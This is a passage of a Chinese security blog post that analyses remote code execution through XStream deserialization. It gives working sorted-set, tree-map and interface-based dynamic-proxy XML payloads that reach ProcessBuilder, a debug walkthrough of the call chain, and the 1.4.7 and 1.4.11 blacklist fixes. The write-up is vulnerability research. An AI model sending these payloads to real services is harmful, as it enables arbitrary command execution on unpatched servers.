class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// Windows</span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>md<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>mi1k7ea<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Linux</span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>"mkdir mi1k7ea"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h5><p>下面我们在<code>xstream.fromXML()</code>语句中打上断点进行调试，同时在EventHandler类中的invoke()和invokeInternal()函数上也打上断点。</p><p>在AbstractTreeMarshallingStrategy.unmarshal()函数中，调用了TreeUnmarshaller.start()函数，即开始解析XML：</p><p><img src="/2019/10/21/XStream反序列化漏洞/12.png" alt=""></p><p>跟进start()函数，发现会调用HierarchicalStreams.readClassType()来获取到PoC XML中根标签的类类型java.util.SortedSet：</p><p><img src="/2019/10/21/XStream反序列化漏洞/4.png" alt=""></p><p>接着是调用convertAnother()函数对java.util.SortedSet类型进行转换，我们跟进去该函数，其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型：</p><p><img src="/2019/10/21/XStream反序列化漏洞/5.png" alt=""></p><p>接着看到调用converterLookup.lookupConverterForType()来寻找TreeSet对应类型的转换器。我们跟进这个函数看看，其是变量所有转换器，通过调用Converter.canConvert()函数来判断该转换器是否能够转换出TreeSet类型，这里找到满足条件的TreeSetConverter转换器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/6.png" alt=""></p><p>在XStream官网中可以查到类对应的Converter：<a href="http://x-stream.github.io/javadoc/com/thoughtworks/xstream/converters/collections/TreeMapConverter.html" target="_blank" rel="noopener">http://x-stream.github.io/javadoc/com/thoughtworks/xstream/converters/collections/TreeMapConverter.html</a></p><p>接着是调用<code>typeToConverterMap.put(type, converter);</code>将类型和转换器的对应关系放入Map表中，再返回转换器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/9.png" alt=""></p><p>往下调试，在AbstractReferenceUnmarshaller.convert()函数中看到，会调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/10.png" alt=""></p><p>接着调用其父类即的FastStack.convert()方法，跟进去，显示将类型压入栈，然后调用转换器TreeSetConverter的unmarshal()方法：</p><p><img src="/2019/10/21/XStream反序列化漏洞/13.png" alt=""></p><p>往下调试，在TreeSetConverter.unmarshal()函数中调用了this.treeMapConverter.populateTreeMap()：</p><p><img src="/2019/10/21/XStream反序列化漏洞/7.png" alt=""></p><p>跟进该函数，先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容缓存到Map中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/8.png" alt=""></p><p>跟进去，发现调用readItem()函数读取标签内的内容并缓存到target这个Map中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/14.png" alt=""></p><p>返回到populateTreeMap()函数中，调用了<code>reader.moveUp();</code>即开始往下读其他元素，然后调用populateMap()函数：</p><p><img src="/2019/10/21/XStream反序列化漏洞/15.png" alt=""></p><p>跟进populateMap()，其中调用了populateCollection()函数，用来循环遍历子标签中的元素并添加到集合中，如图是将动态代理标签添加进集合中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/18.png" alt=""></p><p>而调用的addCurrentElementToCollection()中，会调用readItem()读取标签内容，这里直接跳过具体的读取步骤，看到是成功获取到了该动态代理类并添加到了target这个Map缓存起来了：</p><p><img src="/2019/10/21/XStream反序列化漏洞/19.png" alt=""></p><p>继续跟进去几个函数，会发现调用DynamicProxyConverter.unmarshal()函数，这是由于PoC中含有dynamic-proxy标签会被程序识别并调用对应的DynamicProxyConverter转换器来实现将XML中该标签部分转换成动态代理类对象。而在该转换器的unmarshal()函数中，主要是扫描该标签的内容，然后调用Proxy.newProxyInstance()函数来生成新的动态代理类对象并返回（该动态代理类的target为EventHandler，action为start）：</p><p><img src="/2019/10/21/XStream反序列化漏洞/22.png" alt=""></p><p>在上图我们可以看到DynamicProxyConverter.unmarshal()函数中调用了convertAnother()函数来转换得到EventHandler，跟进该函数会发现是调用了ReflectionConverter转换器来进行EventHandler的解析的：</p><p><img src="/2019/10/21/XStream反序列化漏洞/24.png" alt=""></p><p>下面继续往下调试，回到populateMap()调用的地方。</p><p>调用完populateMap()之后，会判断JVM是否已充分将TreeMap都缓存起来了，然后调用TreeMap类对象resullt的putAll()方法，可看到参数中包含动态代理类，该代理类指向EventHandler类，而该类正如前面介绍时说的那样通过传入target和action参数值来利用反射机制调用了ProcessBuilder(cmd).start()来执行任意命令：</p><p><img src="/2019/10/21/XStream反序列化漏洞/16.png" alt=""></p><p>再跟进去调试，调试到TreeMap.put()函数中发现会调用到动态代理类对象$Proxy0的compareTo()方法来比较动态代理类对象和另一个字符串对象：</p><p><img src="/2019/10/21/XStream反序列化漏洞/17.png" alt=""></p><p><strong>由于我们PoC中interface标签写的是<code>java.lang.Comparable</code>接口，而该接口声明了一个compareTo()方法，因此当调用了动态代理类对象中的Comparable.compareTo()方法时就能成功动态调用PoC中构造的恶意动态代理类，从而通过反射机制达到任意代码执行。</strong></p><p>再往下，会调用到EventHandler.invoke()，其中会通过安全管理器获得权限来执行EventHandler.invokeInternal()函数，可以看到proxy参数是动态代理类对象、\9-]参数是compareTo方法、arguments参数是包含”foo”字符串的数组：</p><p><img src="/2019/10/21/XStream反序列化漏洞/20.png" alt=""></p><p>在EventHandler.invokeInternal()函数中，获取到目标动态代理类对象的实际方法后，就直接通过反射机制调用，从而导致弹计算器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/21.png" alt=""></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>我们在PoC中构造了一对sorted-set标签，其中包含实现了Comparable接口的dynamic-proxy标签，该代理标签中又包含一个指向EventHandler的handler标签，而Eventhandler中则包含了一个ProcessBuilder的target和值为’start’的action。</p><p>在XStream反序列化过程中，解析XML，将sorted-set标签识别出对应的TreeSetConverter转换器，再识别出sorted-set标签内有两个子元素，即string标签和dynamic-proxy标签；string标签会被识别出StringConverter转换器来解析出string标签内的字符串“foo”；dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；最后由于TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。</p><p><strong>整个调试过程主要的函数调用链如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">XStream.fromXML</span><br><span class="line">XStream.unmarshal</span><br><span class="line">AbstractTreeMarshallingStrategy.unmarshal</span><br><span class="line">TreeUnmarshaller.start</span><br><span class="line">HierarchicalStreams.readClassType</span><br><span class="line">TreeUnmarshaller.convertAnother</span><br><span class="line">DefaultConverterLookup.lookupConverterForType</span><br><span class="line">...</span><br><span class="line">TreeSetConverter.unmarshal</span><br><span class="line">TreeSetConverter.populateTreeMap</span><br><span class="line">DynamicProxyConverter.unmarshal</span><br><span class="line">...</span><br><span class="line">ReflectionConverter.canConvert</span><br><span class="line">...</span><br><span class="line">TreeMap.putAll</span><br><span class="line">AbstractMap.putAll</span><br><span class="line">TreeMap.put</span><br><span class="line">$Proxy0.compareTo</span><br><span class="line">EventHandler.invoke</span><br><span class="line">EventHandler.invokeInternal</span><br><span class="line">MethodUtil.invoke</span><br></pre></td></tr></table></figure><h5 id="无法通杀-lt-1-3-1版本的原因"><a href="#无法通杀-lt-1-3-1版本的原因" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>&lt;=1.3.1以下版本不能成功识别出根标签sorted-set的类，也就是说低版本并不支持sorted-set：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.mapper.CannotResolveClassException: sorted-set : sorted-set</span><br></pre></td></tr></table></figure><h5 id="无法通杀1-4-1-4-5版本的原因"><a href="#无法通杀1-4-1-4-5版本的原因" class="headerlink" title="无法通杀1.4-1.4.5版本的原因"></a>无法通杀1.4-1.4.5版本的原因</h5><p>先看下TreeSetConverter.unmarshal()中的代码逻辑，当sortedMapField不为null时，treeMap才有可能不为null，treeMap不为null才能进入populateTreeMap()：</p><p><img src="/2019/10/21/XStream反序列化漏洞/25.png" alt=""></p><p>在1.4-1.4.4版本中，sortedMapField默认为null，因此无法成功利用：</p><p><img src="/2019/10/21/XStream反序列化漏洞/27.png" alt=""></p><p>而在&gt;=1.4.5版本中，sortedMapField默认不为null，因此能成功利用：</p><p><img src="/2019/10/21/XStream反序列化漏洞/26.png" alt=""></p><h5 id="无法通杀1-4-7-1-4-9版本的原因"><a href="#无法通杀1-4-7-1-4-9版本的原因" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>在1.4.7版本的Change Log中有这么一句:</p><blockquote><p>java.bean.EventHandler no longer handled automatically because of severe security vulnerability.</p></blockquote><p>运行PoC会报以下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: No converter specified for class java.beans.EventHandler</span><br><span class="line">---- Debugging information ----</span><br><span class="line">class               : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type       : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">converter-type      : com.thoughtworks.xstream.converters.extended.DynamicProxyConverter</span><br><span class="line">path                : /sorted-set/dynamic-proxy/handler</span><br><span class="line">class[1]            : java.util.TreeSet</span><br><span class="line">converter-type[1]   : com.thoughtworks.xstream.converters.collections.TreeSetConverter</span><br><span class="line">version             : 1.4.7</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤，导致不能成功利用：</p><p><img src="/2019/10/21/XStream反序列化漏洞/28.png" alt=""></p><h5 id="为何1-4-10能够成功"><a href="#为何1-4-10能够成功" class="headerlink" title="为何1.4.10能够成功"></a>为何1.4.10能够成功</h5><p>我们知道1.4.7-1.4.9版本中是因为在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤导致不能成功利用。</p><p>但是我们在1.4.10中发现ReflectionConverter.canConvert()函数中把对EventHandler类的过滤又去掉了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">this</span>.type != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.type == type || <span class="keyword">this</span>.type == <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span>) &amp;&amp; <span class="keyword">this</span>.canAccess(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在利用的过程中虽然能够成功触发，但是控制台会输出提示未初始化XStream安全框架、会存在漏洞风险：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Security framework of XStream not initialized, XStream is probably vulnerable.</span><br></pre></td></tr></table></figure><h5 id="看看1-4-11如何修补的"><a href="#看看1-4-11如何修补的" class="headerlink" title="看看1.4.11如何修补的"></a>看看1.4.11如何修补的</h5><p>直接运行，先提醒未初始化安全框架，然后报错显示安全警告、拒绝反序列化目标类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Security framework of XStream not initialized, XStream is probably vulnerable.</span><br><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Security alert. Unmarshalling rejected.</span><br><span class="line">---- Debugging information ----</span><br><span class="line">message             : Security alert. Unmarshalling rejected.</span><br><span class="line">class               : java.beans.EventHandler</span><br><span class="line">required-type       : java.beans.EventHandler</span><br><span class="line">converter-type      : com.thoughtworks.xstream.XStream$InternalBlackList</span><br><span class="line">path                : /tree-map/entry[2]/dynamic-proxy/handler</span><br><span class="line">class[1]            : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type[1]    : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">converter-type[1]   : com.thoughtworks.xstream.converters.extended.DynamicProxyConverter</span><br><span class="line">class[2]            : java.util.TreeMap</span><br><span class="line">required-type[2]    : java.util.TreeMap</span><br><span class="line">converter-type[2]   : com.thoughtworks.xstream.converters.collections.TreeMapConverter</span><br><span class="line">version             : 1.4.11</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>可以看到，1.4.11以后的版本XStream新增了一个Converter类InternalBlackList，可以看到其实现的canConverter()方法中对EventHandler类、以”javax.crypto.”开头的类、以”$LazyIterator”结尾的类都进行了匹配，而其marshal()和unmarshal()方法都是直接抛出异常的，换句话说就是匹配成功的直接抛出异常即黑名单过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">InternalBlackList</span> <span class="keyword">implements</span> <span class="title">Converter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InternalBlackList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type == Void.TYPE || type == Void.class || !XStream.<span class="keyword">this</span>.securityInitialized &amp;&amp; type != <span class="keyword">null</span> &amp;&amp; (type.getName().equals(<span class="string">"java.beans.EventHandler"</span>) || type.getName().endsWith(<span class="string">"$LazyIterator"</span>) || type.getName().startsWith(<span class="string">"javax.crypto."</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Security alert. Marshalling rejected."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Security alert. Unmarshalling rejected."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在XStream.setupConverters()函数中注册转换器时，InternalBlackList的优先级为PRIORITY_LOW高于ReflectionConverter的优先级PRIORITY_VERY_LOW，因此会优先判断：</p><p><img src="/2019/10/21/XStream反序列化漏洞/31.png" alt=""></p><p>因此，在后面的调试中会发现，当要寻找EventHandler类的转换器时，会返回InternalBlackList转换器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/32.png" alt=""></p><p>当调用该InternalBlackList转换器的unmarshal()方法时，直接抛出异常：</p><p><img src="/2019/10/21/XStream反序列化漏洞/33.png" alt=""></p><h4 id="基于tree-map的PoC"><a href="#基于tree-map的PoC" class="headerlink" title="基于tree-map的PoC"></a>基于tree-map的PoC</h4><h5 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h5><p>通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。</p><h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>payload2.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/3.png" alt=""></p><p>可以看到，该payload涉及到的转换器是TreeMapConverter，至于其整个调用过程以及原理和前面sorted-set的差不多，只是转换器不一样了，这里就不再调试分析了。</p><h5 id="为何能通杀1-4-1-4-5版本"><a href="#为何能通杀1-4-1-4-5版本" class="headerlink" title="为何能通杀1.4-1.4.5版本"></a>为何能通杀1.4-1.4.5版本</h5><p>因为本次payload用的是TreeMapConverter转换器，和前面TreeSetConverter不一样，这里不存在类似sortedMapField是否为null的限制，因为两个转换器的代理逻辑完全不一样，调试一下就清楚了。</p><h5 id="无法通杀-lt-1-3-1版本的原因-1"><a href="#无法通杀-lt-1-3-1版本的原因-1" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>运行PoC会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.converters.ConversionException: TreeMap does not contain &lt;comparator&gt; element</span><br></pre></td></tr></table></figure><p>在TreeMapConverter.unmarshal()中看到，判断子标签节点是否有comparator，若两个if判断条件都不满足则直接抛出异常，不会进入后面的populateMap()函数，因此也不会成功触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/E:/software/hexo/blog/source/_posts/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/29.png" alt=""></p><h5 id="无法通杀1-4-7-1-4-9版本的原因-1"><a href="#无法通杀1-4-7-1-4-9版本的原因-1" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>和前面基于sorted-set的PoC的原因是一样的。</p><h4 id="基于接口的PoC"><a href="#基于接口的PoC" class="headerlink" title="基于接口的PoC"></a>基于接口的PoC</h4><h5 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h5><p>通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。但是缺点是，我们必须得知道服务端反序列化得到的是啥接口类。</p><h5 id="接口特征"><a href="#接口特征" class="headerlink" title="接口特征"></a>接口特征</h5><p>一般的，基于接口类型的payload，是需要按照接口形式来编写的，即interface标签内容指向接口类。比如<a href="http://x-stream.github.io/CVE-2013-7285.html" target="_blank" rel="noopener">官网</a>给的例子，其中Contact是个接口类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contact</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>org.company.model.Contact<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">'java.beans.EventHandler'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">'java.lang.ProcessBuilder'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">contact</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XStream xstream = <span class="keyword">new</span> XStream();</span><br><span class="line">Contact contact = (Contact)xstream.fromXML(xml);</span><br></pre></td></tr></table></figure><p>这种方式是基于服务端解析XML之后会直接调用到XML中interface标签指向的接口类声明的方法，因此这种情形下必然会触发动态代理类对象的恶意方法。</p><h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>下面我们试下这个payload，ipayload.xml，这个更为简单直接，不需要在dynamic-proxy外再加其他的转换器，直接利用的DynamicProxyConverter转换器来识别：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>IPerson<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                <span 